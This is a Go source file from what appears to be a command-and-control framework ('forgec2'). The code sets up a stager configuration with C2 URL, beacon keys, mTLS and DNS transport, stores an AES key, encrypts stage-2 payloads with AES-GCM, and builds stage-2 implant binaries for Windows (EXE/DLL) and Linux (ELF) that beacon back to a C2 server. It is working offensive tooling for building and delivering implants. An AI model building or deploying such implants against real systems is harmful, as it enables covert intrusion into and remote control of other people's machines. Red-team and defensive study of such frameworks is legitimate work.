package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

type StagerConfig struct {
	ListenerID    uint
	C2URL         string
	Protocol      string // http, tcp, p2p (default "http")
	Architecture  string
	OS            string
	Format        string // exe or dll (raw shellcode is not a Go-buildable artifact)
	UserAgent     string
	Profile       string
	SkipTLSVerify bool
	DNSDomain     string
	DNSServer     string
	BeaconKey     string // PSK used to derive registration auth (empty = no PSK auth)
	RegSecretID   string // v3 per-implant registration secret id
	RegSecret     string // v3 per-implant registration secret, base64
	// mTLS client material (PEM) for the stage-2 beacon: a listener that
	// requires a client certificate rejects registration and beacons without
	// it. Carried into the implant config so the same config-blob path as a
	// direct build embeds it (base64, never the build argv).
	MTLSCertPEM string
	MTLSKeyPEM  string
	MTLSCAPEM   string
}

var (
	stagerKey         []byte
	stagerKeyExplicit bool
	stagerKeyOnce     sync.Once
	stagerKeyPath     = filepath.Join("data", "stager.key")
)

// SetStagerKeyFile overrides the on-disk location of the persisted stager key.
// It must be called before the first key initialization (e.g. at server
// startup with the configured data directory) to make key persistence
// independent of the process working directory.
func SetStagerKeyFile(path string) {
	if path != "" {
		stagerKeyPath = path
	}
}

// InitStagerKey loads the persisted stager key or generates a new one.
// A corrupted existing key (wrong length) is reported as an error instead of
// being silently overwritten, which would invalidate every previously issued
// stage token.
func InitStagerKey() error {
	var errOut error
	stagerKeyOnce.Do(func() {
		if stagerKeyExplicit {
			return
		}
		if data, err := os.ReadFile(stagerKeyPath); err == nil {
			if len(data) != 32 {
				errOut = fmt.Errorf("stager key file %s has invalid length %d (want 32); refusing to overwrite it", stagerKeyPath, len(data))
				return
			}
			stagerKey = data
			slog.Info("Stager key loaded from disk", "path", stagerKeyPath)
			return
		}
		key := make([]byte, 32)
		if _, err := rand.Read(key); err != nil {
			errOut = fmt.Errorf("crypto/rand.Read failed for stager key: %w", err)
			return
		}
		stagerKey = key
		if err := os.MkdirAll(filepath.Dir(stagerKeyPath), 0750); err != nil {
			slog.Error("Failed to create stager key directory", "path", filepath.Dir(stagerKeyPath), "error", err)
			return
		}
		if err := os.WriteFile(stagerKeyPath, stagerKey, 0600); err != nil {
			slog.Error("Failed to persist stager key; tokens will not survive a restart", "path", stagerKeyPath, "error", err)
			return
		}
		slog.Info("Stager key initialized and persisted", "path", stagerKeyPath)
	})
	return errOut
}

func GetStagerKey() []byte {
	if err := InitStagerKey(); err != nil {
		slog.Error("Stager key unavailable", "error", err)
		return nil
	}
	return stagerKey
}

// SetStagerKey overrides the in-memory stager key (used by tests and advanced
// deployments). An explicitly set key is authoritative and is never replaced
// by a disk load.
func SetStagerKey(key []byte) {
	if len(key) == 32 {
		stagerKey = key
		stagerKeyExplicit = true
	}
}

func EncryptStage2Payload(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := aead.Seal(nil, nonce, plaintext, nil)
	return append(nonce, ciphertext...), nil
}

func DecryptStage2Payload(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aead.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("payload too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("payload decryption failed: %w", err)
	}
	return plaintext, nil
}

// stagerImplantConfig maps the stager configuration onto the implant config the
// stage-2 beacon is built from. It is a named function so the mapping — in
// particular the mTLS client material a require_client_cert listener needs for
// registration and beacons — is testable without a toolchain. withDNS mirrors
// the historical asymmetry: the Windows stage-2 carries DNS transport settings,
// the Linux one does not.
func stagerImplantConfig(cfg StagerConfig, proto string, withDNS bool) ImplantConfig {
	// The stage-2 binary must not share a path with a concurrent stage-2
	// build: the handler reads the artifact back right after the build and
	// deletes it, so a fixed name let a second request overwrite the first
	// binary (and its registration secret) before it was read.
	implantCfg := ImplantConfig{
		C2URL:         cfg.C2URL,
		Protocol:      proto,
		Interval:      10,
		Jitter:        20,
		UserAgent:     cfg.UserAgent,
		SkipTLSVerify: cfg.SkipTLSVerify,
		Filename:      uniqueBuildName("forgec2_stage2", ""),
		Debug:         false,
		Profile:       cfg.Profile,
		ListenerID:    cfg.ListenerID,
		Architecture:  cfg.Architecture,
		BeaconKey:     cfg.BeaconKey,
		RegSecretID:   cfg.RegSecretID,
		RegSecret:     cfg.RegSecret,
		MTLSCertPEM:   cfg.MTLSCertPEM,
		MTLSKeyPEM:    cfg.MTLSKeyPEM,
		MTLSCAPEM:     cfg.MTLSCAPEM,
	}
	if withDNS {
		implantCfg.DNSDomain = cfg.DNSDomain
		implantCfg.DNSServer = cfg.DNSServer
	}
	return implantCfg
}

func GenerateStagerStage2(cfg StagerConfig, outputDir string) (string, error) {
	proto := cfg.Protocol
	if proto == "" {
		proto = "http"
	}
	implantCfg := stagerImplantConfig(cfg, proto, true)

	if !filepath.IsAbs(outputDir) {
		abs, err := filepath.Abs(outputDir)
		if err == nil {
			outputDir = abs
		}
	}

	switch strings.ToLower(cfg.Format) {
	case "dll":
		return GenerateWindowsDLL(implantCfg, outputDir)
	case "shellcode", "raw":
		return "", fmt.Errorf("raw shellcode stager format is not implemented; use exe or dll")
	default:
		return GenerateWindowsEXE(implantCfg, outputDir)
	}
}

func GenerateStagerStage2Linux(cfg StagerConfig, outputDir string) (string, error) {
	proto := cfg.Protocol
	if proto == "" {
		proto = "http"
	}
	implantCfg := stagerImplantConfig(cfg, proto, false)

	if !filepath.IsAbs(outputDir) {
		abs, err := filepath.Abs(outputDir)
		if err == nil {
			outputDir = abs
		}
	}

	return GenerateLinuxELF(implantCfg, outputDir)
}
